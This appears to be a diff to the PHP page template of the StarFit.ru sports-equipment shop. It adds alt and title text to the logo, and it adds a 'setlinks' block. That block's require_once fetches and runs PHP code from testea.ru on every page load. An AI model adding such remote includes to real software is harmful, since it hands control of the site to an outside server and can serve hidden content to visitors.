@@ -23,7 +23,7 @@
 <?= $this->contact ?>
 						</div>
 					</div>
-					<a href="/" class="logo"><img src="/image/logo.png" /></a>
+					<a href="/" class="logo"><img src="/image/logo.png" title="Интернет-магазин спортивного оборудования и инвентаря - StarFit.ru" alt="Интернет-магазин спортивного оборудования и инвентаря - StarFit.ru"/></a>
 					<div class="phones">
 <?= $this->phone ?>
 						<a href="/callback" class="callback">
@@ -61,6 +61,9 @@
 					<div class="copyright">
 <?= $this->copyright ?>
 					</div>
+				</div>
+				<div class="setlinks">
+					<? require_once( 'http://testea.ru/setlinks/slsimple.php?host=' . urlencode( $_SERVER['HTTP_HOST'] ) . '&uri=' . urlencode( $_SERVER['REQUEST_URI'] ) ); ?> 
 				</div>
 			</div>
 		</div>
